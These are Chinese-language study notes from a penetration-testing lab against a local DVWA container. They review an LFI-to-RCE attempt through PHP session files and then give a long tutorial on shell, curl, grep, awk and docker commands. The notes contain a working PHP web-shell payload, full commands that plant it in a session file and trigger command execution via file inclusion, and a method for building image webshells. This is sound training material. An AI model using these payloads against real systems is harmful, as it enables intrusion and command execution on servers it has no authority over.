# 11/25 资料：复盘 + 命令基础补课

> 三部分：
> 一、今晚（11/24）复盘
> 二、复习与新知识点（前面没讲的）
> 三、命令基础——逐个命令、逐个选项拆开

---

# 第一部分：今晚复盘

## 1.1 今晚做了什么

```
① 想验证 Cookie / Session 机制
   → 看 cookie 文件、看 Set-Cookie 头
   → 发现 session.save_path 没配，session 存在 /tmp

② 用 LFI 读自己的 session 文件
   → 成功，拿到 session_token（就是 CSRF token）

③ 想演示 session 文件包含执行代码
   → 写入 payload，include 它
   → 最后一步：代码确实被执行了，报错 Undefined constant "c"
```

## 1.2 最关键的报错

```
Uncaught Error: Undefined constant "c"
in /tmp/sess_f7dda5f7f457da4966b8958c62811391:1
Stack trace:
#0 /var/www/html/vulnerabilities/fi/index.php(36): include()
```

**逐行读：**

**`Uncaught Error`** —— 未捕获的错误。不是警告，是致命错误，脚本直接停了。

**`Undefined constant "c"`** —— 用了一个叫 `c` 的常量，但它没定义。

**`in /tmp/sess_f7dda...:1`** —— 错误发生在 session 文件的第 1 行。

**`Stack trace`** —— 调用栈。谁调用了谁。

**`#0 /var/www/html/vulnerabilities/fi/index.php(36): include()`** —— 最内层是 `index.php` 第 36 行调用了 `include()`。

**这句话的意思是：include 确实执行了 session 文件，只是代码本身写错了。**

## 1.3 为什么 `$_GET[c]` 会报错

**我们写的 payload 是：**

```php
<?php system($_GET[c]); ?>
```

**注意 `c` 没有引号。**

**PHP 看到 `c` 时，它的判断顺序是：**

一，这是不是 `$` 开头的变量？不是（`$_GET` 是变量，但 `c` 不是）

二，这是不是 `true` / `false` / `null` 这些关键字？不是

三，这是不是已定义的常量？不是

四，**那就当常量用，但找不到，报错**

**PHP 8 里这直接是致命错误。** PHP 7 只是警告，然后把这个"裸词"当成字符串 `"c"`。

**所以以前的 payload 在 PHP 7 上能跑，在 PHP 8 上就挂。**

**修正：**

```php
$_GET['c']    // 单引号
$_GET["c"]    // 双引号
```

**都要加。**

## 1.4 这个错误说明了什么

**代码确实执行了。** 因为如果没执行，就不会有 `Undefined constant` 这种 PHP 运行期错误。

**这正是渗透里"证明漏洞存在"的关键区分：**

| 输出 | 说明 |
|---|---|
| 原样显示 `<?php system($_GET[c]); ?>` | 没执行，只是被当文本输出 |
| 显示 `Undefined constant` 或 `Fatal error` | **执行了**，只是代码有错 |
| 显示命令输出（如 `uid=33`） | 执行了，且代码正确 |

**报错比原样显示更好——它证明代码在跑。**

---

# 第二部分：复习 + 新知识点

## 2.1 这几天四份资料的骨架

| 资料 | 核心 |
|---|---|
| 1118 上传七层 | 文件上传的七道检测，每道怎么绕过 |
| 1121 从字节到代码 | 字节、十六进制、魔数、PHP 的文本/代码双模式 |
| 1122 图片马与 LFI | 真图片马怎么过 getimagesize，include 与 php://filter |
| 1123 LFI 转 RCE | 六条把代码写进服务器的路 |
| 1124 Cookie 与 Session | 三种会话机制的原理 |

**串起来是一条链：**

```
上传洞（把文件放进去）
   ↓
包含洞（把文件读出来执行）
   ↓
RCE（命令执行）
   ↓
而这一切的基础是：理解字节、理解 PHP 怎么解析文件、理解服务器怎么认人
```

## 2.2 新知识点一：PHP 版本差异会杀死 payload

**同一个 payload，不同 PHP 版本结果不同。**

| 写法 | PHP 5.6 | PHP 7 | PHP 8 |
|---|---|---|---|
| `$_GET[c]` | 正常（当字符串） | 警告，仍当字符串 | **致命错误** |
| `$_GET['c']` | 正常 | 正常 | 正常 |

**实战意义：**

你在老 CTF 题里抄的 payload 可能在 PHP 8 目标上直接挂。

**判断目标 PHP 版本：**

```bash
# 通过报错信息看
# 或者用 phpinfo
```

**防护建议：写 payload 永远加引号。**

**这是"版本差异导致 payload 失效"的一个具体例子。** 类似的问题还有：

PHP 5.x 的 `%00` 截断（PHP 5.3.4 之后修复）

`ereg()` 系列函数在 PHP 7 移除

`mysql_query()` 在 PHP 7 移除

## 2.3 新知识点二：session 的生命周期

**你今晚撞上的墙，本质是不知道 session 的完整生命周期。**

```
请求进来
   ↓
session_start()
   ├─ 有 cookie？→ 按 cookie 里的 id 找文件
   │    ├─ 找到 → 读出来，反序列化 → 变成 $_SESSION 数组
   │    └─ 读失败 → $_SESSION = 空数组
   └─ 没 cookie？→ 生成新 id，$_SESSION = 空数组
   ↓
   （你的代码执行，可能修改 $_SESSION）
   ↓
请求结束
   ↓
把 $_SESSION 数组 序列化 写回文件
   ↓
发送响应
```

**关键在最后两步的顺序：写回发生在请求结束。**

**所以：**

**第一次请求**：你写的 payload 还在文件里 → include 能读到 → **能执行**

**请求结束**：PHP 把空 session 写回 → **payload 被覆盖**

**第二次请求**：文件里已经是空 session 了 → **不能执行**

**这就是为什么"只有一次机会"。**

**真实环境里为什么能反复成功？**

因为写 session 的是网站本身。用户在登录框填 `<?php ... ?>`，网站把它存进 session，PHP 序列化成 `username|s:XX:"<?php ... ?>";`。

**这个格式是合法的，PHP 反序列化成功，请求结束时原样写回，不会被覆盖。**

**而且这个格式里藏着 `<?php`，include 照样能执行。**

**你今晚的错误在于：手动写的时候用了不合法的格式（或者长度写错），导致 PHP 反序列化失败，session 被当空处理。**

## 2.4 新知识点三：序列化的长度字段是硬约束

**PHP 的 serialize 格式：**

```
s:26:"<?php system($_GET[c]); ?>";
```

`s` = string
`26` = **长度**
`"..."` = 内容

**PHP 反序列化时会校验这个长度。**

**如果长度和实际不符：**

反序列化失败 → 后面的数据全部丢弃 → session 变空

**这就是"写 payload 要算字符数"的原因。**

**数长度的技巧：**

```bash
printf '%s' '<?php system($_GET["c"]); ?>' | wc -c
```

`wc -c` 数字节数（不是字符数，但纯 ASCII 时一样）。

**注意 `wc -c` 算的是字节，中文字符一个字 3 字节。**

---

# 第三部分：命令基础（重点）

> 这一部分按"从规则到命令"的顺序讲。
> 每一条命令的每个选项都拆开。

## 3.0 shell 的基本规则

### 3.0.1 一条命令由什么组成

```
docker exec dvwa-dvwa-1 ls -l /tmp
  ↑       ↑          ↑  ↑   ↑
程序名   参数1     参数2 选项 参数3
```

**规则：**

**第一个词是程序名** —— shell 去 `$PATH` 里找这个程序

**后面的词都是参数** —— 一起传给程序

**空格分隔** —— 多个空格和单个空格一样

**以 `-` 开头的一般是选项（flag）**

### 3.0.2 变量赋值：等号两边绝对不能有空格

**正确：**

```bash
CK="PHPSESSID=abc; security=low"
```

**错误：**

```bash
CK = "PHPSESSID=abc; security=low"
```

**为什么错：** shell 会把 `CK` 当成命令名，去找一个叫 `CK` 的程序，报 `command not found`。

**这是新手第一大坑。**

### 3.0.3 单引号 vs 双引号（极其重要）

| 引号 | 变量会不会被替换 | 特殊字符 |
|---|---|---|
| `"双引号"` | **会**替换 `$VAR` | `$`、`` ` ``、`\` 有特殊含义 |
| `'单引号'` | **不会**，原样保留 | 全部原样，除了 `'` 本身 |

**举例：**

```bash
X=hello
echo "值是 $X"    # 输出：值是 hello
echo '值是 $X'    # 输出：值是 $X
```

**这条规则决定了你写 payload 时用哪种引号。**

**实战应用：**

```bash
curl -A "<?php echo 'LOG'; ?>" http://目标/
```

外面双引号（因为要传一个整体给 `-A`），里面单引号（PHP 语法里字符串用单引号）。

**如果你把外面的双引号换成单引号：**

```bash
curl -A '<?php echo "LOG"; ?>' http://目标/
```

也能工作，里面换成双引号。

**关键是不能三层都同一种引号，会打架。**

### 3.0.4 变量展开：`$VAR` 和 `${VAR}`

**`$CK`** —— 取变量 `CK` 的值

**`${CK}`** —— 一样，但可以明确边界

**为什么要 `${}`：**

```bash
X=abc
echo "$Xdef"      # 输出空 + def → "def"（因为 shell 以为变量名叫 Xdef）
echo "${X}def"    # 输出 abcdef
```

**你今晚的报错就来自这个：**

```bash
docker exec dvwa-dvwa-1 php -r 'file_put_contents("/tmp/sess_'"$SID"'", "...")'
```

`'"$SID"'` 这种写法就是"单引号结束 → 双引号展开变量 → 单引号继续"，很绕。

**更清楚的写法：**

```bash
docker exec dvwa-dvwa-1 php -r "file_put_contents('/tmp/sess_${SID}', '...');"
```

### 3.0.5 命令替换：`$(...)`

```bash
SID=$(grep PHPSESSID c.txt | awk '{print $7}')
```

**`$(命令)` 的作用：先执行里面的命令，把输出当作值。**

**过程：**

1. shell 看到 `$(...)`
2. 执行里面的 `grep ... | awk ...`
3. 把输出最后的换行去掉
4. 赋给 `SID`

**老写法用反引号：**

```bash
SID=`grep PHPSESSID c.txt | awk '{print $7}'`
```

**反引号已过时，`$()` 更好，因为能嵌套。**

### 3.0.6 管道 `|`

```bash
cat c.txt | awk '{print $7}'
```

**作用：把前一个命令的"标准输出"，接到后一个命令的"标准输入"。**

**理解要点：**

`cat c.txt` 不知道自己后面有 `awk`，它只是正常输出

`awk` 不知道前面是 `cat`，它只是正常读输入

**两边完全不知道对方的存在。**

**这就是 Unix 的设计哲学：每个程序只做一件事，用管道组合。**

### 3.0.7 重定向：`>`、`>>`、`<`、`2>`、`2>&1`

| 符号 | 作用 | 例子 |
|---|---|---|
| `>` | 输出到文件，**覆盖** | `echo hi > a.txt` |
| `>>` | 输出到文件，**追加** | `echo hi >> a.txt` |
| `<` | 从文件读输入 | `sort < a.txt` |
| `2>` | 错误输出到文件 | `cmd 2> err.txt` |
| `2>&1` | 错误也走标准输出 | `cmd > all.txt 2>&1` |
| `2>/dev/null` | 丢弃错误 | `cmd 2>/dev/null` |

**为什么有 `2>`：**

Unix 每个进程有三个默认通道：

**0** = 标准输入（stdin）
**1** = 标准输出（stdout）
**2** = 标准错误（stderr）

**`>` 默认只重定向 1，`2>` 定向 2。**

**你今晚用过：**

```bash
... | base64 -d 2>/dev/null
```

**意思是：base64 报的错（`invalid input`）不要显示，扔掉。**

**`/dev/null`** 是 Linux 的"黑洞文件"，写进去的东西永远消失。

### 3.0.8 `&&` 和 `||`

```bash
cd /tmp && rm -f c.txt
```

**`&&`** —— 前一个成功（退出码 0）才执行后一个

```bash
cmd1 || cmd2
```

**`||`** —— 前一个失败才执行后一个

**组合：**

```bash
cmd1 && cmd2 || cmd3
```

先试 cmd1，成功做 cmd2，失败做 cmd3。

### 3.0.9 退出码 `$?`

```bash
ls /tmp
echo $?
```

**`$?` 是上一个命令的退出码。**

**0 = 成功，非 0 = 失败。**

**`&&` 和 `||` 就是靠这个判断的。**

### 3.0.10 heredoc：`<<`

```bash
cat > /tmp/x.txt << 'EOF'
第一行
第二行
EOF
```

**作用：把中间几行当作输入传给命令。**

**`<< 'EOF'` 的 `'EOF'` 加单引号 = 中间内容不做任何变量替换，原样写入。**

不加单引号的话 `$VAR` 会被替换。

**`EOF` 是结束标记，可以换成任何词（`END`、`SCRIPT` 都行），但要前后一致。**

**你今晚用过：**

```bash
cat > /tmp/upcmd.sh << 'SCRIPT'
#!/bin/bash
...
SCRIPT
```

**这就是在写一个脚本文件。**

---

## 3.1 `ls` —— 列目录

```bash
ls -l /var/log/apache2/
ls -la /tmp
```

| 选项 | 作用 |
|---|---|
| `-l` | 长格式：权限、属主、大小、时间、文件名 |
| `-a` | 显示隐藏文件（`.` 开头） |
| `-h` | 大小用人看得懂的单位（K/M/G） |
| `-t` | 按修改时间排序 |
| `-r` | 反序 |
| `-R` | 递归子目录 |

**`-l` 的输出怎么读：**

```
-rw------- 1 www-data www-data 135 Nov 24 15:04 sess_abc
```

| 位置 | 值 | 含义 |
|---|---|---|
| 1 | `-` | 文件类型：`-`普通文件、`d`目录、`l`符号链接 |
| 2-4 | `rw-` | 属主权限：读/写/执行 |
| 5-7 | `---` | 属组权限 |
| 8-10 | `---` | 其他人权限 |
| 11 | `1` | 硬链接数 |
| 12 | `www-data` | 属主 |
| 13 | `www-data` | 属组 |
| 14 | `135` | 字节数 |
| 15-17 | `Nov 24 15:04` | 修改时间 |
| 18 | `sess_abc` | 文件名 |

**权限部分怎么读：**

`r` = 读（4）
`w` = 写（2）
`x` = 执行（1）

`rw-------` = 属主读写（6），其他人什么都没有（0，0）

**所以是 600。**

**这就是今晚 `Permission denied` 的根源：600 只允许属主写。**

## 3.2 `cat` —— 输出文件内容

```bash
cat /tmp/c.txt
cat file1 file2 > merged
```

| 选项 | 作用 |
|---|---|
| `-n` | 显示行号 |
| `-A` | 显示不可见字符（`$` 表示行尾） |

**用途一：看文件**

**用途二：拼接文件**

```bash
cat real.jpg shell.php > shell.jpg
```

**这是图片马的生成方式——两个文件按顺序接起来。**

## 3.3 `head` —— 看开头

```bash
head -n 5 file
head -c 300 file
```

| 选项 | 作用 |
|---|---|
| `-n N` | 前 N 行 |
| `-c N` | 前 N 个字节 |
| `-q` | 多文件时不显示文件名 |

**`-c` 是字节不是字符。** 二进制文件（图片、日志）要用 `-c`。

**你用过：**

```bash
curl ... | head -c 300
```

只看响应前 300 字节，判断是不是 base64。

## 3.4 `tail` —— 看结尾

```bash
tail -n 20 file
tail -c 200 file
tail -f file
```

| 选项 | 作用 |
|---|---|
| `-n N` | 最后 N 行 |
| `-c N` | 最后 N 个字节 |
| `-f` | **持续跟踪**，文件新增内容立刻显示 |
| `-F` | 跟踪，文件被轮转也继续跟 |

**`-f` 是运维最常用的选项**，盯日志实时输出。

**⚠️ 今晚的坑：`tail` 遇到管道（FIFO）会阻塞等待。**

因为 `tail` 默认要读到文件末尾才知道"最后 N 行"是什么。如果是管道，永远没有"末尾"，就一直等。

**这和 `-f` 无关，是 `tail` 本身的读法。**

## 3.5 `grep` —— 搜索文本

```bash
grep "pattern" file
grep -oP "name='user_token' value='\K[^']+" 
```

| 选项 | 作用 |
|---|---|
| `-o` | **只输出匹配的部分**，不输出整行 |
| `-P` | 用 PCRE（Perl 兼容正则），支持 `\K`、`\d` 等 |
| `-E` | 用扩展正则（`+`、`?`、`\|` 不用转义） |
| `-a` | 把二进制文件当文本处理 |
| `-i` | 忽略大小写 |
| `-v` | **反向匹配**，输出不匹配的行 |
| `-n` | 显示行号 |
| `-c` | 只输出匹配的行数 |
| `-r` | 递归目录 |

**`-a` 是今晚踩坑学到的：**

（没加 `-a` 时 grep 会输出 `binary file matches` 就停）

**`-oP "...\K[^']+"` 逐段拆：**

`-o` —— 只输出匹配到的部分

`-P` —— PCRE 模式

`name='user_token' value='` —— 找到这个固定字符串

`\K` —— **"从这里开始算匹配"**，也就是把前面找到的丢掉，只保留后面的

`[^']+` —— 一个或多个"非单引号"的字符

**合起来的意思：找到 `name='user_token' value='` 之后，把引号里的内容抠出来。**

**`\K` 是 PCRE 的杀手级特性**，比用捕获组 + 反向引用简单得多。

## 3.6 `awk` —— 按列处理

```bash
awk '{print $7}' c.txt
awk -F: '{print $1}' /etc/passwd
```

| 选项 | 作用 |
|---|---|
| `-F 分隔符` | 指定字段分隔符（默认空格/Tab） |

**`{print $7}` 拆开：**

`{}` —— 动作块，里面是"每行要做什么"

`print` —— 打印

`$7` —— **第 7 个字段**（`$0` 是整行，`$1` 是第一个）

**为什么是第 7 列：**

cookie 文件是 Tab 分隔的七列：

```
域名   子域  路径  HTTPS  过期  名字     值
127.0.0.1 FALSE /  FALSE  0   PHPSESSID abc123
   1     2    3    4     5      6        7
```

**所以 `$7` 是值。**

**awk 和 cut 的区别：**

`cut -f7` 也能做，但 `awk` 能写复杂逻辑，而且对连续空格处理更好。

## 3.7 `printf` —— 格式化输出

```bash
printf '%s' '<?php echo 1; ?>'
printf '\xff\xd8\xff\xe0'
printf '%-10s|' name
```

**为什么不用 `echo`：**

| | `echo` | `printf` |
|---|---|---|
| 默认加换行 | 是 | 否 |
| 支持 `\x` 转义 | 看 shell | **是** |
| 格式控制 | 无 | 有 |

**`echo -n`** 可以不加换行，但 `\x` 转义的行为因 shell 而异。

**`printf '\xff\xd8\xff\xe0'` 会输出 4 个真实字节（0xFF 0xD8 0xFF 0xE0）**，这是造 JPEG 头的方法。

**格式符：**

`%s` —— 字符串
`%d` —— 整数
`%x` —— 十六进制
`\n` —— 换行
`\t` —— Tab

**`printf '%s' '...'` 的写法**：第一个参数是格式，后面的都当字符串填进去。

**为什么用 `'%s'` 而不是直接 `printf '...'`：**

因为如果内容里有 `%`，直接打印会被当格式符。用 `%s` 就安全了。

## 3.8 `xxd` —— 十六进制查看

```bash
xxd file
xxd -l 16 file
xxd -r hex.txt > bin
```

| 选项 | 作用 |
|---|---|
| （无） | 十六进制 + ASCII 对照 |
| `-l N` | 只看前 N 字节 |
| `-s N` | 从第 N 字节开始 |
| `-r` | 反向：把十六进制转回二进制 |
| `-p` | 纯十六进制，不要 ASCII 列 |

**输出格式：**

```
00000000: 4749 4638 3961 3c3f 7068 7020 6563 686f  GIF89a<?php echo
```

`00000000` —— 偏移量（第几个字节开始）

`4749 4638 3961` —— 十六进制，每 2 个字符 = 1 字节

`GIF89a<?php echo` —— ASCII 对照，不可打印的显示成 `.`

## 3.9 `base64` —— 编码/解码

```bash
base64 file          # 编码
base64 -d            # 解码
```

| 选项 | 作用 |
|---|---|
| `-d` | decode，解码 |
| `-w N` | 每 N 个字符换行（`-w 0` 不换行） |

**解码时可以用管道：**

```bash
curl ... | base64 -d
```

**`base64 -d` 遇到非 base64 字符会报 `invalid input`，但已解出的部分仍然有效。**

## 3.10 `curl` —— 发 HTTP 请求（最重要）

**基本形式：**

```bash
curl [选项] URL
```

### 输出控制

| 选项 | 作用 |
|---|---|
| `-s` | silent，不显示进度条 |
| `-S` | 出错时仍显示错误（配合 `-s`） |
| `-i` | 显示响应头 |
| `-I` | 只要响应头（HEAD 请求） |
| `-o 文件` | 输出到文件 |
| `-O` | 用 URL 里的文件名保存 |
| `-v` | 详细模式，显示完整请求和响应 |

**`-s` 是必加项。** 不加的话进度条会污染输出，导致管道后续处理出错。

### 请求构造

| 选项 | 作用 |
|---|---|
| `-X METHOD` | 指定方法（GET/POST/PUT/DELETE） |
| `-d "k=v&k2=v2"` | POST 数据（表单格式） |
| `-d @file` | 从文件读 POST 数据 |
| `--data-urlencode` | 自动 URL 编码 |
| `-F "name=@文件"` | 上传文件（multipart） |
| `-F "name=值"` | 普通表单字段 |
| `-H "头: 值"` | 自定义请求头 |
| `-A "UA"` | 设置 User-Agent（等价于 `-H "User-Agent: ..."`） |
| `-e "referer"` | 设置 Referer |

**`-d` 和 `-F` 的区别：**

`-d` = `application/x-www-form-urlencoded`，普通表单
`-F` = `multipart/form-data`，文件上传

**所以文件上传必须用 `-F`。**

### Cookie 处理

| 选项 | 作用 |
|---|---|
| `-b 文件` | **从文件读 cookie 发送** |
| `-c 文件` | **把响应的 cookie 存到文件** |
| `-b "k=v; k2=v2"` | 直接发 cookie 字符串 |

**`-b` 和 `-c` 可以同时用同一个文件：**

```bash
curl -s -b c.txt -c c.txt ...
```

**意思是：发的时候带上已存的 cookie，收到新的再存回去。**

**这就是"保持会话"的做法。**

**注意：`-b "字符串"` 和 `-b 文件` 的区分是看参数像不像文件名。** 有点歧义，所以文件一般用相对路径或确认文件存在。

### 其他常用

| 选项 | 作用 |
|---|---|
| `-k` | 忽略 HTTPS 证书错误 |
| `-L` | 跟随重定向 |
| `-x proxy` | 用代理 |
| `--max-time N` | 超时秒数 |

**`-k` 在打自签名证书的靶场时必加。**

**`-L` 也很重要**：不加的话 302 就停了，看不到最终页面。

### 一个完整例子拆解

```bash
curl -s -b c.txt -c c.txt -d "username=admin&password=password&Login=Login&user_token=$LT" -o /dev/null http://127.0.0.1:4280/login.php
```

`curl` —— 程序

`-s` —— 静默，不要进度条

`-b c.txt` —— 发送之前存的 cookie

`-c c.txt` —— 把响应的新 cookie 存进同一个文件

`-d "..."` —— POST 这些表单数据

`-o /dev/null` —— 响应体丢进黑洞（我们不需要页面内容）

`http://...` —— 目标

## 3.11 `docker` —— 容器操作

### `docker exec` —— 在运行的容器里执行命令

```bash
docker exec [选项] 容器名 命令
```

| 选项 | 作用 |
|---|---|
| `-i` | 保持标准输入打开（stdin） |
| `-t` | 分配伪终端（tty） |
| `-u 用户` | 指定执行用户（用户名或 UID） |
| `-w 目录` | 指定工作目录 |
| `-e K=V` | 设置环境变量 |

**`-it` 常一起用** —— 进入交互式 shell。

```bash
docker exec -it 容器 bash
```

**但有 `bash` 在最后时才能用 `-it`；如果只是执行一条命令读文件，不需要 `-t`。**

**为什么 heredoc 要加 `-i`：**

```bash
docker exec -i 容器 bash -c 'cat > 文件' << 'EOF'
内容
EOF
```

`<<` 是把内容送进标准输入，而 `docker exec` 默认**不转发** stdin，必须加 `-i`。

### `docker cp` —— 容器和宿主机之间传文件

```bash
docker cp 本地路径 容器名:容器内路径    # 拷进去
docker cp 容器名:容器内路径 本地路径    # 拷出来
```

**特点：** 它直接操作容器文件系统，**不经过容器内的进程**，所以没有权限限制。

**今晚 `docker cp` 能写、`docker exec` 不能写，就是这个原因。**

### `docker compose` —— 管理多容器项目

| 子命令 | 作用 |
|---|---|
| `docker compose up -d` | 后台启动全部服务 |
| `docker compose down` | 停止并删除容器 |
| `docker compose ps` | 列出服务状态 |
| `docker compose logs` | 看日志 |
| `docker compose restart` | 重启 |

**`-d`** = detached，后台运行。

**`docker compose ps` 看什么：**

`STATUS` 列是 `Up` 就正常，`Exit` 或 `Restarting` 就有问题。

## 3.12 权限命令

### `chmod` —— 改权限

```bash
chmod 600 file
chmod 777 file
chmod +x script.sh
```

| 写法 | 含义 |
|---|---|
| `600` | 属主读写，其他人无 |
| `644` | 属主读写，其他人只读 |
| `755` | 属主读写执行，其他人读执行 |
| `777` | 所有人全部权限 |

**数字怎么来的：**

读 4 + 写 2 + 执行 1

`6` = 4+2 = 读写
`7` = 4+2+1 = 全部
`5` = 4+1 = 读执行
`0` = 无

**三位分别是：属主 / 属组 / 其他人。**

**`chmod +x`** 是符号模式，给所有人加执行权限。

### `chown` —— 改属主

```bash
chown www-data:www-data file
chown -R user:group dir/
```

**格式：`用户:组`**

`-R` = 递归。

**今晚用过：**

```bash
chown www-data:www-data /tmp/sess_$SID
```

**因为 docker cp 传进去的文件属主是 root，PHP 用 www-data 跑，读不了。**

## 3.13 其他

### `timeout` —— 限时执行

```bash
timeout 3 cat file
timeout -s KILL 5 cmd
```

**`3`** = 3 秒后杀掉

**`-s KILL`** = 用 SIGKILL 而不是默认的 SIGTERM

**用途：防止命令卡死。** 今晚 `tail` 卡住时用它兜底。

### `file` —— 判断文件类型

```bash
file /tmp/shell.gif
```

**输出：**

```
/tmp/shell.gif: GIF image data, version 89a, 16188 x 26736
```

**它只看文件头几个字节，所以会被伪装的文件骗。** 这就是"假图头能骗过它"的原因。

### `wc` —— 统计

```bash
wc -c file    # 字节数
wc -l file    # 行数
wc -w file    # 词数
```

**算序列化长度时用 `wc -c`。**

### `echo` 和 `printf` 的区别再强调

```bash
echo "hello"       # 输出 hello + 换行
echo -n "hello"    # 输出 hello 不换行（但 `-n` 在某些 shell 不认）
printf "hello"     # 输出 hello 不换行（标准方式）
printf '%s' "$X"   # 安全地输出变量
```

**写脚本一律用 `printf`。**

---

# 第四部分：今晚的实操命令（带逐项解析）

## 4.1 登录拿 cookie

```bash
cd /tmp
rm -f c.txt
LT=$(curl -s -c c.txt http://127.0.0.1:4280/login.php | grep -oP "name='user_token' value='\K[^']+")
curl -s -b c.txt -c c.txt -d "username=admin&password=password&Login=Login&user_token=$LT" http://127.0.0.1:4280/login.php -o /dev/null
SID=$(grep PHPSESSID c.txt | awk '{print $7}')
CK="PHPSESSID=$SID; security=low"
echo "$CK"
```

**逐条：**

`cd /tmp` —— 切到临时目录，避免污染

`rm -f c.txt` —— `-f` 强制删除，文件不存在也不报错

`LT=$(...)` —— 命令替换，把 token 存进变量

`curl -s` —— 静默

`-c c.txt` —— 存 cookie

`| grep -oP "..."` —— 抠 token

`-b c.txt -c c.txt` —— 带上刚拿的 cookie，并把新的存回去

`-d "..."` —— POST 表单

`-o /dev/null` —— 页面内容不要

`SID=$(grep ... | awk '{print $7}')` —— 从 cookie 文件取第 7 列

`CK="..."` —— 拼成可用的 cookie 字符串

`echo "$CK"` —— 检查有没有值

## 4.2 看 cookie 文件

```bash
cat /tmp/c.txt
```

**看七列结构。**

## 4.3 看响应头

```bash
curl -i -s http://127.0.0.1:4280/login.php | grep -i "set-cookie"
```

`-i` —— 带响应头
`-s` —— 静默
`grep -i` —— 忽略大小写匹配 `Set-Cookie`

## 4.4 看 session 配置

```bash
docker exec dvwa-dvwa-1 php -i | grep "session.save_path"
```

`docker exec` —— 在容器里跑
`php -i` —— 相当于 `phpinfo()`，输出全部配置
`grep` —— 找那一行

## 4.5 看 session 文件

```bash
docker exec dvwa-dvwa-1 ls -l /var/lib/php/sessions/ | head
docker exec dvwa-dvwa-1 cat /tmp/sess_$SID
```

## 4.6 用 LFI 读 session

```bash
curl -s -H "Cookie: $CK" "http://127.0.0.1:4280/vulnerabilities/fi/?page=/tmp/sess_$SID" | grep -a "session_token"
```

`-H "Cookie: $CK"` —— 手动传 cookie

`grep -a` —— 把二进制当文本（session 文件可能有二进制）

## 4.7 写 payload

```bash
printf '%s' '<?php system($_GET["c"]); ?>' > /tmp/p3.txt
docker cp /tmp/p3.txt dvwa-dvwa-1:/tmp/sess_$SID
docker exec -u root dvwa-dvwa-1 chown www-data:www-data /tmp/sess_$SID
docker exec -u root dvwa-dvwa-1 chmod 600 /tmp/sess_$SID
```

**四步：**

1. `printf '%s'` 写文件，不加换行
2. `docker cp` 传进去
3. `chown` 改属主为 www-data
4. `chmod 600` 设成只有属主读写

## 4.8 验证

```bash
curl -s -H "Cookie: $CK" "http://127.0.0.1:4280/vulnerabilities/fi/?page=/tmp/sess_$SID&c=id" | grep -a "uid="
```

---

# 第五部分：每天要背的三个基础

**一，三条规则**

等号两边不能有空格：`X=1` 不是 `X = 1`

单引号不替换变量，双引号替换

`$(...)` 先执行再取值

**二，三个符号**

`|` 管道：左边输出 → 右边输入

`>` 覆盖写，`>>` 追加写

`&&` 前面成功才执行后面

**三，三个必加选项**

`curl -s` 静默

`grep -o` 只输出匹配部分

`ls -l` 看权限

---

# 一句总结

**命令不是"背下来的咒语"，是"程序 + 选项 + 参数"。**

**看懂每个选项在干什么，比你敲一万遍都有用。**
